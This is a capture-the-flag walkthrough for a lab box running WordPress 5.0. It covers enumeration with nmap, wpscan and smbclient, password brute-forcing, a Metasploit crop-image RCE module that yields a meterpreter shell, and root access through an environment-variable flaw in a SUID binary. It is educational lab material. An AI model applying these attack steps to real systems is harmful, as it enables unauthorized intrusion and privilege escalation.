# what I learn
- wpscan
- wordpress 5.0 exploit
- reverse enginering 
- ltrace a a  debugging utility in Linux.

# enumerate
## nmap
```console
kali@kali:~$ sudo python3 pymap.py -t 10.10.44.145
[sudo] password for kali: 
created by gu2rks/kurohat 
find me here https://github.com/gu2rks

port scanning...
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
Enumerating open ports...
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-17 11:10 EDT
Nmap scan report for 10.10.44.145
Host is up (0.054s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
|_  256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 5.0
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%), Linux 3.2 - 4.9 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: BLOG, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: blog
|   NetBIOS computer name: BLOG\x00
|   Domain name: \x00
|   FQDN: blog
|_  System time: 2020-07-17T15:10:46+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-07-17T15:10:46
|_  start_date: N/A

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   44.90 ms 10.8.0.1
2   44.82 ms 10.10.44.145

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.04 seconds
```

## users

```console
kali@kali:~$ wpscan --url http://blog.thm --enumerate u
.
.
.
[+] kwheel
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] bjoel
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Karen Wheeler
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Rss Generator (Aggressive Detection)

[+] Billy Joel
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Rss Generator (Aggressive Detection)
.
.
.
```

## smb
```console
kali@kali:~$ smbclient -L \\\\blog.thm
Enter WORKGROUP\kali's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        BillySMB        Disk      Billy's local SMB Share
        IPC$            IPC       IPC Service (blog server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
kali@kali:~/THM/blog$ smbclient \\\\blog.thm\\BillySMB
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue May 26 14:17:05 2020
  ..                                  D        0  Tue May 26 13:58:23 2020
  Alice-White-Rabbit.jpg              N    33378  Tue May 26 14:17:01 2020
  tswift.mp4                          N  1236733  Tue May 26 14:13:45 2020
  check-this.png                      N     3082  Tue May 26 14:13:43 2020

                15413192 blocks of size 1024. 9788792 blocks available
smb: \> get Alice-White-Rabbit.jpg 
getting file \Alice-White-Rabbit.jpg of size 33378 as Alice-White-Rabbit.jpg (48.4 KiloBytes/sec) (average 48.4 KiloBytes/sec)
smb: \> get tswift.mp4 
getting file \tswift.mp4 of size 1236733 as tswift.mp4 (665.4 KiloBytes/sec) (average 498.5 KiloBytes/sec)
smb: \> get check-this.png 
getting file \check-this.png of size 3082 as check-this.png (16.9 KiloBytes/sec) (average 466.4 KiloBytes/sec)
smb: \> exit
```

seem like smb shared file are a trap :P

# Foothold
let start with brute forcing to gain access to wordpress dashboard
```console
kali@kali:~/THM/blog$ wpscan --url http://blog.thm --passwords /usr/share/wordlists/rockyou.txt --usernames kwheel,bjoel
```
After some time, you will get the 1 credential with auther priv


I try to upload reverse shell ``.phtml`` in media but it didnt work (I wish lol). But from the dashboad we will see that the current version of the wordpress is 5.0. google 'metasploit wordpress 5.0' you will find [this](https://www.exploit-db.com/exploits/46662)


Note from the expliot:
This module exploits a path traversal and a local file inclusion
vulnerability on WordPress versions 5.0.0 and <= 4.9.8.
The crop-image function allows a user, with at least **author privileges**,
to resize an image and perform a path traversal by changing the _wp_attached_file
reference during the upload. The second part of the exploit will include
this image in the current theme by changing the _wp_page_template attribute
when creating a post


this is prefect. let hope that it work if it works: (it didnt work at the first 4 tries, keep getting `[-] Exploit failed: An exploitation error occurred. [*] Exploit completed, but no session was created.` then I decided to update my msfconsole)


how to set all the options? [read this](https://www.rapid7.com/db/modules/exploit/multi/http/wp_crop_rce) run `show options` to check all the options. **Remember** to set `LHOST`


YEAH we are in
```console
meterpreter > shell
Process 1542 created.
Channel 1 created.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
which python
/usr/bin/python
```
now let spawn tty using python ```python -c 'import pty; pty.spawn("/bin/sh")'``` sad tho, we dont know www-data cant ```sudo -l```
I found user.txt but... there is no flag! just message
```
$ cat /home/bjoel/user.txt
cat /home/bjoel/user.txt
You won't find what you're looking for here.

TRY HARDER
```
Bitch pls, now let try to get all files owned by `bjoel`
```console
$ find / -user bjoel 2> /dev/null
find / -user bjoel 2> /dev/null
/home/bjoel
/home/bjoel/.gnupg
/home/bjoel/.cache
/home/bjoel/.sudo_as_admin_successful
/home/bjoel/Billy_Joel_Termination_May20-2020.pdf
/home/bjoel/user.txt
/home/bjoel/.bashrc
/home/bjoel/.profile
/home/bjoel/.bash_logout
/media/usb
```
okey im sure that flag is in `/media/usb`


next try to check SUID
```console
$ find / -user root -perm -4000 -exec ls -ldb {} \; 2> /dev/null
find / -user root -perm -4000 -exec ls -ldb {} \; 2> /dev/null
-rwsr-xr-x 1 root root 59640 Mar 22  2019 /usr/bin/passwd
-rwsr-xr-x 1 root root 40344 Mar 22  2019 /usr/bin/newgrp
-rwsr-xr-x 1 root root 75824 Mar 22  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 44528 Mar 22  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root 76496 Mar 22  2019 /usr/bin/chfn
-rwsr-xr-x 1 root root 149080 Jan 31 17:18 /usr/bin/sudo
-rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 18448 Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-sr-x 1 root root 8432 May 26 18:27 /usr/sbin/checker
-rwsr-xr-x 1 root root 100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-- 1 root messagebus 42992 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-sr-x 1 root root 109432 Oct 30  2019 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 43088 Mar  5 17:23 /bin/mount
-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 26696 Mar  5 17:23 /bin/umount
-rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root root 44664 Mar 22  2019 /bin/su
-rwsr-xr-x 1 root root 40152 Oct 10  2019 /snap/core/8268/bin/mount
-rwsr-xr-x 1 root root 44168 May  7  2014 /snap/core/8268/bin/ping
-rwsr-xr-x 1 root root 44680 May  7  2014 /snap/core/8268/bin/ping6
-rwsr-xr-x 1 root root 40128 Mar 25  2019 /snap/core/8268/bin/su
-rwsr-xr-x 1 root root 27608 Oct 10  2019 /snap/core/8268/bin/umount
-rwsr-xr-x 1 root root 71824 Mar 25  2019 /snap/core/8268/usr/bin/chfn
-rwsr-xr-x 1 root root 40432 Mar 25  2019 /snap/core/8268/usr/bin/chsh
-rwsr-xr-x 1 root root 75304 Mar 25  2019 /snap/core/8268/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39904 Mar 25  2019 /snap/core/8268/usr/bin/newgrp
-rwsr-xr-x 1 root root 54256 Mar 25  2019 /snap/core/8268/usr/bin/passwd
-rwsr-xr-x 1 root root 136808 Oct 11  2019 /snap/core/8268/usr/bin/sudo
-rwsr-xr-- 1 root systemd-resolve 42992 Jun 10  2019 /snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 428240 Mar  4  2019 /snap/core/8268/usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root root 106696 Dec  6  2019 /snap/core/8268/usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root dip 394984 Jun 12  2018 /snap/core/8268/usr/sbin/pppd
-rwsr-xr-x 1 root root 40152 Jan 27 14:28 /snap/core/9066/bin/mount
-rwsr-xr-x 1 root root 44168 May  7  2014 /snap/core/9066/bin/ping
-rwsr-xr-x 1 root root 44680 May  7  2014 /snap/core/9066/bin/ping6
-rwsr-xr-x 1 root root 40128 Mar 25  2019 /snap/core/9066/bin/su
-rwsr-xr-x 1 root root 27608 Jan 27 14:28 /snap/core/9066/bin/umount
-rwsr-xr-x 1 root root 71824 Mar 25  2019 /snap/core/9066/usr/bin/chfn
-rwsr-xr-x 1 root root 40432 Mar 25  2019 /snap/core/9066/usr/bin/chsh
-rwsr-xr-x 1 root root 75304 Mar 25  2019 /snap/core/9066/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39904 Mar 25  2019 /snap/core/9066/usr/bin/newgrp
-rwsr-xr-x 1 root root 54256 Mar 25  2019 /snap/core/9066/usr/bin/passwd
-rwsr-xr-x 1 root root 136808 Jan 31 18:37 /snap/core/9066/usr/bin/sudo
-rwsr-xr-- 1 root systemd-resolve 42992 Nov 29  2019 /snap/core/9066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 428240 Mar  4  2019 /snap/core/9066/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 110792 Apr 10 16:44 /snap/core/9066/usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root dip 394984 Feb 11 15:40 /snap/core/9066/usr/sbin/pppd
```


this file looks interesting !!! `-rwsr-sr-x 1 root root 8432 May 26 18:27 /usr/sbin/checker` when I try to run it
```
$ checker
checker
Not an Admin
```

let use meterpreter to **download** it and open/revers engi with IDA.

```
meterpreter > download /usr/sbin/checker
[*] Downloading: /usr/sbin/checker -> checker
[*] Downloaded 8.23 KiB of 8.23 KiB (100.0%): /usr/sbin/checker -> checker
[*] download   : /usr/sbin/checker -> checker
```

![IDA](pic/Screenshot%202020-07-17%20at%2020.40.46.png)

So seem like if `admin` is not set then we will get `Not an Admin` message. let try run `ltrace`, a  debugging utility in Linux. read more about it [here](https://en.wikipedia.org/wiki/Ltrace) and [here](https://blog.packagecloud.io/eng/2016/03/14/how-does-ltrace-work/) 


```console
$ ltrace checker
getenv("admin")                                  = nil
puts("Not an Admin")                             = 13
Not an Admin
+++ exited (status 0) +++
```

So if the global varible call `admin` is not set, it will return `Not an Admin`. to create a global varible use ```export```
```console
$ export admin=kurohat
export admin=kurohat
$ ltrace checker
getenv("admin")                                  = "kurohat"
setuid(0)                                        = -1
system("/bin/bash")
```
**IT WORKS!!!!**
```console
$ checker
checker
root@blog:/var/www/wordpress# ls /media/usb
ls /media/usb
user.txt
root@blog:/var/www/wordpress# cat /media/usb/user.txt
cat /media/usb/user.txt
root@blog:/var/www/wordpress# cd /root/
cd /root/
root@blog:/root# ls
ls
root.txt
root@blog:/root# cat root.txt
cat root.txt
```

PS. if you have **Ghidra** use it in stead for **IDA**, it come with `Decompiling` feature I will try it next time